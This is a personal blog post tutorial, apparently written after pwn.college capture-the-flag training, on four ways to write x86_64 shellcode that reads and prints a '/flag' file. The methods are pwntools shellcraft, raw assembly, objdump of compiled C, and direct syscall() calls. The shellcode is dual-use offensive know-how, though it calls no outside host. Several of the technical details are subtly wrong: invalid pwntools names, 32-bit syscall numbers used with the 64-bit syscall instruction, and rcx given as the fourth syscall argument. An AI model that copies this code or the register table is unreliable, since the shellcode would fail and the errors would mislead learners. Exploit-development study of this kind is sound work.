---
layout: post
title: How to Write Shellcode for Shellcode Injection and Simplify Assembly Code Development
subtitle: Learn through First principles c
gh-repo: muchiking.github.io/
# gh-badge: [star, fork, follow]
tags: [cybersecurity.binary,pwn]
comments: true
---

# How to Write Shellcode for Shellcode Injection and Simplify Assembly Code Development

Shellcode injection is a powerful technique that allows the injection and execution of custom code within a target process. In this blog post, we'll explore different approaches to writing shellcode and discuss methods to streamline the development of assembly code.


# way one

## The Power of Pwntools: Crafting Shellcode with Python

One of the easiest ways to write shellcode is by using the Python library called pwntools. Pwntools provides a rich set of features to simplify exploit development, including a module called shellcraft, which helps in crafting shellcode for various operations.

Here's an example of using pwntools and shellcraft to generate shellcode that reads and prints the contents of the "/flag" file:

```
from pwn import *
content.update(arch="amd64")
pay=(asm(shellcraft.cat('/flag')))
printf(pay=(asm(shellcraft.cat('/flag'))))
```




By leveraging pwntools and shellcraft, you can easily generate shellcode for different operations, such as file manipulation, network communication, or privilege escalation.


hoold up that's not the end some of us do not want peace.
all in all  its best to have multiple ways to do things since you may want a functionality that is not implemented by pwn tools 

# way two 

## Hardcoding Assembly: Fine-grained Control and Understanding

### directly hard code it using assembly like the chad you are 

For those seeking more control and a deeper understanding of the inner workings of shellcode, hardcoding assembly instructions can be a viable approach. Let's take a closer look at the assembly code for opening, reading, and writing a file using the x86_64 architecture:

```
global _start
section .text

_start:
    ; Open the file
    mov eax, 0x5   ; sys_open system call number
    mov edi, filename
    mov esi, 0     ; flags (O_RDONLY)
    xor edx, edx   ; mode (permissions)
    syscall

    ; Read from the file
    mov ebx, eax   ; file descriptor
    mov eax, 0x3   ; sys_read system call number
    mov edi, ebx   ; file descriptor
    lea esi, [rsp] ; buffer address
    mov edx, 0x100 ; buffer size
    syscall

    ; Write to STDOUT
    mov eax, 0x4   ; sys_write system call number
    mov edi, 1     ; STDOUT file descriptor
    mov edx, eax   ; bytes to write
    syscall

    ; Exit the program
    mov eax, 0x1   ; sys_exit system call number
    xor ebx, ebx   ; exit status
    syscall

section .data
    filename db "/flag",0

```

By directly working with assembly code, you have fine-grained control over the instructions and can better understand the interactions between the operating system and your code.

save it as a dot .s file eg thanksforreadintheblog.s
then compile it with the -nostdlib flag
```
gcc -nostdlib -o thanksforreadintheblog thanksforreadintheblog.s
```

though assembly is for chads it lacks documentation

the best documentation out there are x86_64 syscals tables
![Pasted image 20230713211214.png](/assets/img/20230713211214.png)

as you can see they are not that clear like the flags to open the files i found it from linux kernel files written by the world wide wwe heavy weight champion  Linus Torvald  

and that is why we have to be smart
the smartest way to move is by the use of c and yes you do not need to learn programming to be a hacker.

#  part way 3 and way 4 

## Using C to Implement binary: Streamlining the Process

While writing shellcode in assembly can be powerful, it can also be time-consuming. A more efficient approach is to leverage the capabilities of C programming to implement shellcode using system calls. The POSIX standard provides a common interface for system calls across different Unix-like operating systems.

we will be using the posix standard since it is a standard that is followed by all who want to interact with the kernel

the defination by onchan chat gpt is that posix is 
```
POSIX stands for "Portable Operating System Interface." It is a set of standards that define the application programming interface (API), shell interface, and utility interfaces for software compatibility between different Unix-like operating systems. POSIX-compliant systems provide a common framework for developing and executing software, allowing programs written for one POSIX-compliant operating system to run on another without significant modifications.

```

this is how you implement it

![Pasted image 20230713213655.png](/assets/img/20230713213655.png)

after compiling you can get the assembly code by running objdump on the compiled binary 

![Pasted image 20230713214331.png](/assets/img/20230713214331.png)





![Pasted image 20230713221523.png](/assets/img/20230713221523.png)

as you can see this registers match appart from rax 

from the compiled binary you just replace call with syscall and eax with the call number  by doing this you save yourself a lot of time reading man pages 

The fourth

the easiest way to do this is by using a direct syscall in c eg

```
#include <sys/fcntl.h>
#include <sys/unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
// #include <sys/syscall.h>

#define BUFSIZE 4096


void main(){
char buffer[BUFSIZE];
ssize_t bytesRead;
ssize_t bytesWritten;
int fd;
fd=syscall(SYS_open,"/flag",O_RDONLY);
bytesRead = syscall(SYS_read, fd, buffer, BUFSIZE);
bytesWritten = syscall(SYS_write, STDOUT_FILENO, buffer, bytesRead);
syscall(SYS_close, fd);
}
```

the assembly code generated looks like this
![Pasted image 20230713220301.png](/assets/img/20230713220301.png)


this is syntax used in to pass values that are soon to be executed by a function in assembly.

```
rax: caries return values also carries syscal values usaly the 0 argument
rdi:    First Argument
rsi:    Second Argument
rdx:    Third Argument
rcx:    Fourth Argument
r8:     Fifth Argument
r9:     Sixth Argument
```


since in the c files the syscall function takes more operators one extra argument is added that pushes things to the next rargument register so to reverse this you just mov arguments one regsiter back eg 
![Pasted image 20230714001630.png](/assets/img/20230714001630.png)

what is in rdi goes to rax, what is in rsi to rdi  then on and on.
the good thing about this method is that you do not need to check the syscall table thus saves you more time. 


Thank you for taking the time to read through this blog post. I would like to express my gratitude to the pwn.collage for their valuable training and challenging experiences, which have contributed to my understanding of shellcode injection.

I hope you found this blog post informative and helpful. If you have any further questions or need assistance, please feel free to reach out. Have a great day ahead!
